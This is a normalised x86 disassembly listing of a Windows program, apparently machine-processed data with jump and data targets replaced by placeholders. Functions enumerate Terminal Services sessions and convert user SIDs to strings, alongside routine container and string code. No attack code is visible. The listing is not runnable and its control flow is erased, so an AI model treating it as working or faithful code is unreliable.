mov esp ebp
pop ebp
retn
push esi
call [ WTSCloseServer@IAT ]
mov al [ ebp - 0xa9 ]
jmp r-xdata
mov edx [ ebp - 0xb0 ]
push edx
call [ WTSFreeMemory@IAT ]
mov al [ ebp - 0xa9 ]
xor esi esi
mov dx [ ecx ]
add ecx 0x2
cmp dx bx
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
lea ecx [ ebp - 0x4c ]
call sub_401c90
mov eax 0x7
xor edx edx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] dx
mov [ ebp - 0x4 ] ebx
xor ecx ecx
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x8c ] cx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x70 ] dx
mov [ ebp - 0x4 ] 0x2
mov edx [ ebp - 0xb0 ]
lea eax [ ebp - 0x70 ]
push eax
mov eax [ esi + edx + 0xc ]
lea ecx [ ebp - 0x8c ]
push ecx
push eax
mov eax [ ebp - 0xc8 ]
call sub_40d540
add esp 0xc
test al al
je r-xdata
mov eax [ ebp - 0xb0 ]
mov eax [ esi + eax + 0xc ]
lea ecx [ ebp - 0xc0 ]
push ecx
push eax
call [ ConvertSidToStringSidW@IAT ]
test eax eax
setne al
cmp al bl
je r-xdata
push ebx
lea ecx [ ebp - 0x70 ]
push ecx
or eax 0xffffffff
lea edi [ ebp - 0x30 ]
call sub_401be0
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x30 ]
mov eax edx
cmp ecx 0x8
jae r-xdata
mov eax [ ebp - 0xb0 ]
lea ecx [ ebp - 0x30 ]
cmp [ esi + eax + 0xc ] ebx
je r-xdata
mov eax [ ebp - 0xc0 ]
mov ecx eax
lea edi [ ecx + 0x2 ]
mov edi [ ebp - 0x20 ]
cmp ecx 0x8
lea eax [ eax + edi * 2 ]
mov ecx edx
jae r-xdata
mov eax edi
push 0x4
mov eax r--data
call sub_401c90
push 0xd
mov eax r--data
call sub_401c90
push ebx
lea ecx [ ebp - 0xa8 ]
push 0x1
push ecx
call sub_40e020
add esp 0xc
push ebx
push eax
or eax 0xffffffff
lea edi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x3
call sub_406d90
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x94 ] 0x8
jb r-xdata
mov dx [ ecx ]
add ecx 0x2
cmp dx bx
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
lea ecx [ ebp - 0x30 ]
call sub_401c90
mov edx [ ebp - 0xc0 ]
push edx
call [ LocalFree@IAT ]
jmp r-xdata
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x30 ]
xor edx edx
mov [ ebp - 0x5c ] 0x7
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x70 ] dx
cmp [ ebp - 0x78 ] edi
jb r-xdata
mov ecx [ ebp - 0x70 ]
push ecx
call sub_43811c
add esp 0x4
xor eax eax
mov [ ebp - 0x94 ] 0x7
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0xa8 ] ax
jmp r-xdata
mov edx [ ebp - 0xa8 ]
push edx
call sub_43811c
add esp 0x4
mov edi [ ebp - 0xc4 ]
lea ecx [ ebp - 0x54 ]
call sub_410870
mov edi 0x8
cmp [ ebp - 0x5c ] edi
jb r-xdata
lea edi [ ebp - 0x30 ]
call sub_4109d0
push 0x0
lea edx [ ebp - 0x8c ]
push edx
or eax 0xffffffff
call sub_406d90
xor ebx ebx
jmp r-xdata
sub eax ecx
sar eax 0x1
mov ebx eax
xor ecx ecx
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x78 ] 0x7
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x8c ] cx
cmp [ ebp - 0x1c ] edi
jb r-xdata
mov eax [ ebp - 0x8c ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] ax
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_43811c
add esp 0x4
mov eax [ ebp - 0xbc ]
inc eax
add esi 0x10
mov [ ebp - 0xbc ] eax
cmp eax [ ebp - 0xb8 ]
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_43811c
add esp 0x4
mov eax [ ebp - 0xb0 ]
mov ecx [ esi + eax ]
mov [ ebp - 0x54 ] ecx
mov edx [ esi + eax + 0x4 ]
xor ecx ecx
mov [ ebp - 0x50 ] edx
mov eax [ esi + eax + 0x8 ]
mov [ ebp - 0x4c ] cx
mov ecx eax
mov [ ebp - 0x38 ] 0x7
mov [ ebp - 0x3c ] ebx
lea edi [ ecx + 0x2 ]
nop
mov esi [ ebp - 0xb4 ]
sub_410740
cmp [ esi + 0x38 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x38 ] 0x7
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x24 ] cx
cmp [ esi + 0x1c ] 0x8
jb r-xdata
mov eax [ esi + 0x24 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
mov [ esi + 0x1c ] 0x7
mov [ esi + 0x18 ] 0x0
mov [ esi + 0x8 ] ax
retn
mov edx [ esi + 0x8 ]
push edx
call sub_43811c
add esp 0x4
sub_410790
push ebp
mov ebp esp
push 0xffffffff
push sub_451b12
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ ebx + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebx ]
cmp eax esi
ja r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp eax edx
je r-xdata
mov ecx ebx
call sub_410910
sub esi eax
mov eax 0x38e38e39
imul esi
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x24
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
push edx
add esi 0x8
mov [ eax + 0x4 ] ecx
push esi
mov ecx [ ebx ]
lea eax [ esi + esi * 8 ]
lea ecx [ ecx + eax * 4 ]
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
xor edx edx
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
mov ecx ebx
call sub_410910
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x4 ]
push edx
add ecx 0x8
mov [ eax + 0x4 ] esi
push ecx
jmp r-xdata
lea edi [ eax + 0x8 ]
mov [ edi + 0x14 ] 0x7
xor eax eax
mov [ edi + 0x10 ] edx
mov [ edi ] ax
or eax 0xffffffff
call sub_401be0
sub_410870
push ebp
mov ebp esp
push 0xffffffff
push sub_452022
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ edi + 0x4 ]
cmp esi eax
jae r-xdata
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ecx [ edi ]
cmp ecx esi
ja r-xdata
mov eax [ edi + 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov ecx edi
call sub_410980
sub esi ecx
cmp eax [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x40
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
mov eax [ edi + 0x4 ]
and esi 0xffffffc0
add esi [ edi ]
mov [ ebp - 0x10 ] eax
mov ecx esi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx edi
call sub_410980
jmp r-xdata
push eax
call sub_410d50
sub_410910
mov edx [ ecx + 0x4 ]
push esi
push edi
mov edi [ ecx ]
sub edx edi
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp esi 0x71c71c6
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx edi
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_435a79
pop edi
pop esi
retn
mov edx eax
shr edx 0x1
mov edi 0x71c71c7
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_410a70
mov eax esi
cmp eax esi
jae r-xdata
sub_410980
mov eax [ ecx + 0x4 ]
push esi
mov esi [ ecx ]
sub eax esi
sar eax 0x6
cmp eax 0x3fffffe
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
inc eax
sar edx 0x6
cmp eax edx
jbe r-xdata
push r--data
call sub_435a79
pop esi
retn
push edi
mov esi edx
shr esi 0x1
mov edi 0x3ffffff
sub edi esi
cmp edi edx
pop edi
jae r-xdata
add edx esi
xor edx edx
jmp r-xdata
push edx
call sub_410b70
mov edx eax
cmp edx eax
jae r-xdata
sub_4109d0
mov eax [ edi + 0x10 ]
cmp eax ebx
jae r-xdata
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
push r--data
call sub_435ac6
push esi
lea esi [ eax + 0x1 ]
mov eax edi
call sub_401ef0
test al al
je r-xdata
push r--data
call sub_435a79
mov eax edi
pop esi
retn
mov eax [ edi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov edx [ edi + 0x10 ]
sub edx ebx
add edx edx
push edx
lea ecx [ ecx + ebx * 2 ]
push ecx
lea edx [ eax + ebx * 2 + 0x2 ]
push edx
call sub_437db0
mov ecx 0x8
add esp 0xc
cmp [ edi + 0x14 ] ecx
jb r-xdata
mov eax edi
xor ecx ecx
mov [ eax + esi * 2 ] cx
mov eax [ edi ]
xor ecx ecx
mov [ eax + esi * 2 ] cx
mov eax edi
pop esi
retn
mov edx 0x5c
mov [ eax + ebx * 2 ] dx
mov [ edi + 0x10 ] esi
cmp [ edi + 0x14 ] ecx
jb r-xdata
sub_410a70
push ebp
mov ebp esp
push 0xffffffff
push sub_451e90
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x71c71c7
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_435a79
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_410c50
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_410df0
mov edi [ esi + 0x4 ]
mov ecx [ esi ]
mov edx edi
sub edx ecx
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov ebx edx
shr ebx 0x1f
add esp 0xc
add ebx edx
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax + eax * 8 ]
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
lea ecx [ ebx + ebx * 8 ]
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov edx [ ebp + 0x8 ]
push edx
mov eax ecx
call sub_410cb0
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x8
sub_410b70
push ebp
mov ebp esp
push 0xffffffff
push sub_451e70
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x3ffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x6
cmp eax ebx
jae r-xdata
push r--data
call sub_435a79
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx ebx
call sub_40c810
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_410eb0
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov edi ecx
add esp 0xc
sub edi eax
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
shl ebx 0x6
add ebx eax
and edi 0xffffffc0
add edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] edi
mov [ esi ] eax
mov edx [ ebp + 0x8 ]
push edx
mov ebx ecx
call sub_410cf0
mov eax [ esi ]
push eax
call sub_43811c
mov ebx [ ebp + 0x8 ]
add esp 0x8
sub_410c50
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x71c71c7
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_437cb3
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_43c3a5
lea eax [ ecx + ecx * 8 ]
add eax eax
add eax eax
push eax
call sub_438178
add esp 0x4
test eax eax
jne r-xdata
sub_410cb0
cmp eax edi
je r-xdata
retn
push esi
lea esi [ eax + 0x1c ]
xor ecx ecx
mov [ esi ] 0x7
mov [ esi - 0x4 ] 0x0
mov [ esi - 0x14 ] cx
add esi 0x24
lea edx [ esi - 0x1c ]
cmp edx edi
jne r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_43811c
add esp 0x4
cmp [ esi ] 0x8
jb r-xdata
pop esi
sub_410cf0
cmp eax ebx
je r-xdata
retn
push esi
push edi
lea esi [ eax + 0x38 ]
xor edi edi
jmp r-xdata
cmp [ esi ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi ] 0x7
mov [ esi - 0x4 ] edi
mov [ esi - 0x14 ] cx
cmp [ esi - 0x1c ] 0x8
jb r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
mov [ esi - 0x1c ] 0x7
mov [ esi - 0x20 ] edi
mov [ esi - 0x30 ] ax
add esi 0x40
lea ecx [ esi - 0x38 ]
cmp ecx ebx
jne r-xdata
mov edx [ esi - 0x30 ]
push edx
call sub_43811c
add esp 0x4
pop edi
pop esi
sub_410d50
push ebp
mov ebp esp
push 0xffffffff
push sub_4517ab
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov esi [ ebp + 0x8 ]
mov eax [ ebx ]
mov [ esi ] eax
mov ecx [ ebx + 0x4 ]
xor edx edx
lea edi [ esi + 0x8 ]
mov [ esi + 0x4 ] ecx
push edx
lea eax [ ebx + 0x8 ]
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
or eax 0xffffffff
mov [ edi ] dx
call sub_401be0
xor eax eax
mov [ ebp - 0x4 ] eax
lea edi [ esi + 0x24 ]
push eax
mov [ edi + 0x10 ] eax
add ebx 0x24
xor ecx ecx
mov [ edi + 0x14 ] 0x7
push ebx
or eax 0xffffffff
mov [ edi ] cx
call sub_401be0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_410df0
push ebp
mov ebp esp
push 0xffffffff
push sub_451e51
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov ebx ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
lea ebx [ ebx ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
add esi 0x24
mov [ ebp - 0x4 ] 0x0
mov [ ebp + 0xc ] esi
add ebx 0x24
jmp r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov ecx [ ebx + 0x4 ]
xor edx edx
lea edi [ esi + 0x8 ]
mov [ esi + 0x4 ] ecx
push edx
lea eax [ ebx + 0x8 ]
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
or eax 0xffffffff
mov [ edi ] dx
call sub_401be0
cmp ebx [ ebp + 0x8 ]
je r-xdata
sub_410e7c
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_43c3a5
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_410fa0
add esi 0x24
cmp esi edi
jne r-xdata
sub_410eb0
push ebp
mov ebp esp
push 0xffffffff
push sub_451e1c
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov ebx ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
lea ebx [ ebx ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
add esi 0x40
mov [ ebp - 0x4 ] 0x0
mov [ ebp + 0xc ] esi
add ebx 0x40
jmp r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov ecx [ ebx + 0x4 ]
xor edx edx
lea edi [ esi + 0x8 ]
mov [ esi + 0x4 ] ecx
push edx
lea eax [ ebx + 0x8 ]
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
or eax 0xffffffff
mov [ edi ] dx
call sub_401be0
xor ecx ecx
lea edi [ esi + 0x24 ]
mov [ ebp - 0x4 ] 0x2
push ecx
lea edx [ ebx + 0x24 ]
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
push edx
or eax 0xffffffff
mov [ edi ] cx
call sub_401be0
cmp ebx [ ebp + 0x8 ]
je r-xdata
sub_410f67
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_43c3a5
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_410740
add esi 0x40
cmp esi edi
jne r-xdata
sub_410fd0
push ebp
mov ebp esp
push 0xffffffff
push sub_4545db
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push r--data
push 0x0
call sub_439ffd
add esp 0x8
push 0x40000
call sub_438fc8
push eax
call sub_43917d
add esp 0x4
push eax
call sub_43928b
add esp 0x8
push 0x40000
call sub_438fc8
add eax 0x20
push eax
call sub_43917d
add esp 0x4
push eax
call sub_43928b
add esp 0x8
push 0x40000
call sub_438fc8
add eax 0x40
push eax
call sub_43917d
add esp 0x4
push eax
call sub_43928b
push 0x18
call sub_438178
add esp 0xc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push eax
call sub_411a00
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
mov edx [ eax ]
mov ecx eax
mov eax [ edx ]
push 0x1
call eax
mov [ ebp - 0x4 ] 0xffffffff
test eax eax
je r-xdata
sub_4110b0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_454566
mov eax [ fs : 0x0 ]
push eax
sub esp 0x448
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x440 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x458 ]
mov [ fs : 0x0 ] eax
xor eax eax
xor esi esi
mov edi ecx
mov [ esp + 0x404 ] ax
mov ebx 0x7
push esi
mov eax r--data
lea ecx [ esp + 0x408 ]
mov [ esp + 0x41c ] ebx
mov [ esp + 0x418 ] esi
call sub_401c90
mov [ esp + 0x460 ] esi
xor ecx ecx
mov [ esp + 0x420 ] cx
push 0x8
mov eax r--data
lea ecx [ esp + 0x424 ]
mov [ esp + 0x438 ] ebx
mov [ esp + 0x434 ] esi
call sub_401c90
lea ecx [ esp + 0x43c ]
mov [ esp + 0x460 ] 0x1
call sub_429c40
add edi 0x4
lea ecx [ esp + 0x404 ]
mov [ esp + 0x460 ] 0x2
call sub_412ff0
xor edx edx
push 0x6
mov eax r--data
lea ecx [ esp + 0x378 ]
mov [ esp + 0x38c ] ebx
mov [ esp + 0x388 ] esi
mov [ esp + 0x378 ] dx
call sub_401c90
mov [ esp + 0x460 ] 0x3
xor eax eax
mov [ esp + 0x390 ] ax
push 0x1c
mov eax r--data
lea ecx [ esp + 0x394 ]
mov [ esp + 0x3a8 ] ebx
mov [ esp + 0x3a4 ] esi
call sub_401c90
lea ecx [ esp + 0x3ac ]
mov [ esp + 0x460 ] 0x4
call sub_413940
lea ecx [ esp + 0x374 ]
mov [ esp + 0x460 ] 0x5
call sub_412ff0
xor ecx ecx
mov [ esp + 0x2e4 ] cx
push 0x6
mov eax r--data
lea ecx [ esp + 0x2e8 ]
mov [ esp + 0x2fc ] ebx
mov [ esp + 0x2f8 ] esi
call sub_401c90
mov [ esp + 0x460 ] 0x6
xor edx edx
push 0xf
mov eax r--data
lea ecx [ esp + 0x304 ]
mov [ esp + 0x318 ] ebx
mov [ esp + 0x314 ] esi
mov [ esp + 0x304 ] dx
call sub_401c90
lea ecx [ esp + 0x31c ]
mov [ esp + 0x460 ] bl
call sub_42a9f0
mov [ esp + 0x460 ] 0x8
lea ecx [ esp + 0x2e4 ]
call sub_412ff0
xor eax eax
mov [ esp + 0x254 ] ax
push ebx
mov eax r--data
lea ecx [ esp + 0x258 ]
mov [ esp + 0x26c ] ebx
mov [ esp + 0x268 ] esi
call sub_401c90
mov [ esp + 0x460 ] 0x9
xor ecx ecx
mov [ esp + 0x270 ] cx
push 0x1a
mov eax r--data
lea ecx [ esp + 0x274 ]
mov [ esp + 0x288 ] ebx
mov [ esp + 0x284 ] esi
call sub_401c90
lea ecx [ esp + 0x28c ]
mov [ esp + 0x460 ] 0xa
call sub_421fd0
lea ecx [ esp + 0x254 ]
mov [ esp + 0x460 ] 0xb
call sub_412ff0
xor edx edx
push 0x6
mov eax r--data
lea ecx [ esp + 0x1c8 ]
mov [ esp + 0x1dc ] ebx
mov [ esp + 0x1d8 ] esi
mov [ esp + 0x1c8 ] dx
call sub_401c90
mov [ esp + 0x460 ] 0xc
xor eax eax
mov [ esp + 0x1e0 ] ax
push 0x18
mov eax r--data
lea ecx [ esp + 0x1e4 ]
mov [ esp + 0x1f8 ] ebx
mov [ esp + 0x1f4 ] esi
call sub_401c90
lea ecx [ esp + 0x1fc ]
mov [ esp + 0x460 ] 0xd
call sub_42cda0
lea ecx [ esp + 0x1c4 ]
mov [ esp + 0x460 ] 0xe
call sub_412ff0
xor ecx ecx
mov [ esp + 0x134 ] cx
push ebx
mov eax r--data
lea ecx [ esp + 0x138 ]
mov [ esp + 0x14c ] ebx
mov [ esp + 0x148 ] esi
call sub_401c90
mov [ esp + 0x460 ] 0xf
xor edx edx
push 0x19
mov eax r--data
lea ecx [ esp + 0x154 ]
mov [ esp + 0x168 ] ebx
mov [ esp + 0x164 ] esi
mov [ esp + 0x154 ] dx
call sub_401c90
lea ecx [ esp + 0x16c ]
mov [ esp + 0x460 ] 0x10
call sub_428980
lea ecx [ esp + 0x134 ]
mov [ esp + 0x460 ] 0x11
call sub_412ff0
mov [ esp + 0xb8 ] ebx
mov [ esp + 0xb4 ] esi
xor eax eax
mov [ esp + 0xa4 ] ax
push 0x9
mov eax r--data
lea ecx [ esp + 0xa8 ]
call sub_401c90
mov [ esp + 0x460 ] 0x12
xor ecx ecx
mov [ esp + 0xc0 ] cx
push 0x1b
mov eax r--data
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd8 ] ebx
mov [ esp + 0xd4 ] esi
call sub_401c90
lea ecx [ esp + 0xdc ]
mov [ esp + 0x460 ] 0x13
call sub_420d90
lea ecx [ esp + 0xa4 ]
mov [ esp + 0x460 ] 0x14
call sub_412ff0
xor edx edx
push 0x6
mov eax r--data
lea ecx [ esp + 0x18 ]
mov [ esp + 0x2c ] ebx
mov [ esp + 0x28 ] esi
mov [ esp + 0x18 ] dx
call sub_401c90
mov [ esp + 0x460 ] 0x15
xor eax eax
mov [ esp + 0x30 ] ax
push 0x18
mov eax r--data
lea ecx [ esp + 0x34 ]
mov [ esp + 0x48 ] ebx
mov [ esp + 0x44 ] esi
call sub_401c90
lea ecx [ esp + 0x4c ]
mov [ esp + 0x460 ] 0x16
call sub_418ec0
lea ecx [ esp + 0x14 ]
mov [ esp + 0x460 ] 0x17
call sub_412ff0
xor ecx ecx
mov [ esp + 0x20c ] cx
push 0xb
mov eax r--data
lea ecx [ esp + 0x210 ]
mov [ esp + 0x224 ] ebx
mov [ esp + 0x220 ] esi
call sub_401c90
mov [ esp + 0x460 ] 0x18
xor edx edx
push 0x1b
mov eax r--data
lea ecx [ esp + 0x22c ]
mov [ esp + 0x240 ] ebx
mov [ esp + 0x23c ] esi
mov [ esp + 0x22c ] dx
call sub_401c90
lea ecx [ esp + 0x244 ]
mov [ esp + 0x460 ] 0x19
call sub_428730
lea ecx [ esp + 0x20c ]
mov [ esp + 0x460 ] 0x1a
call sub_412ff0
xor eax eax
mov [ esp + 0x3d0 ] ebx
mov [ esp + 0x3cc ] esi
mov [ esp + 0x3bc ] ax
push ebx
mov eax r--data
lea ecx [ esp + 0x3c0 ]
call sub_401c90
mov [ esp + 0x460 ] 0x1b
xor ecx ecx
mov [ esp + 0x3d8 ] cx
push 0x18
mov eax r--data
lea ecx [ esp + 0x3dc ]
mov [ esp + 0x3f0 ] ebx
mov [ esp + 0x3ec ] esi
call sub_401c90
lea ecx [ esp + 0x3f4 ]
mov [ esp + 0x460 ] 0x1c
call sub_42dde0
lea ecx [ esp + 0x3bc ]
mov [ esp + 0x460 ] 0x1d
call sub_412ff0
xor edx edx
push 0x5
mov eax r--data
lea ecx [ esp + 0x180 ]
mov [ esp + 0x194 ] ebx
mov [ esp + 0x190 ] esi
mov [ esp + 0x180 ] dx
call sub_401c90
mov [ esp + 0x460 ] 0x1e
xor eax eax
mov [ esp + 0x198 ] ax
push 0x19
mov eax r--data
lea ecx [ esp + 0x19c ]
mov [ esp + 0x1b0 ] ebx
mov [ esp + 0x1ac ] esi
call sub_401c90
lea ecx [ esp + 0x1b4 ]
mov [ esp + 0x460 ] 0x1f
call sub_41f310
lea ecx [ esp + 0x17c ]
mov [ esp + 0x460 ] 0x20
call sub_412ff0
xor ecx ecx
mov [ esp + 0x29c ] cx
push ebx
mov eax r--data
lea ecx [ esp + 0x2a0 ]
mov [ esp + 0x2b4 ] ebx
mov [ esp + 0x2b0 ] esi
call sub_401c90
mov [ esp + 0x460 ] 0x21
xor edx edx
push 0xb
mov eax r--data
lea ecx [ esp + 0x2bc ]
mov [ esp + 0x2d0 ] ebx
mov [ esp + 0x2cc ] esi
mov [ esp + 0x2bc ] dx
call sub_401c90
lea ecx [ esp + 0x2d4 ]
mov [ esp + 0x460 ] 0x22
call sub_424a20
lea ecx [ esp + 0x29c ]
mov [ esp + 0x460 ] 0x23
call sub_412ff0
xor eax eax
mov [ esp + 0xec ] ax
push 0x6
mov eax r--data
lea ecx [ esp + 0xf0 ]
mov [ esp + 0x104 ] ebx
mov [ esp + 0x100 ] esi
call sub_401c90
mov [ esp + 0x460 ] 0x24
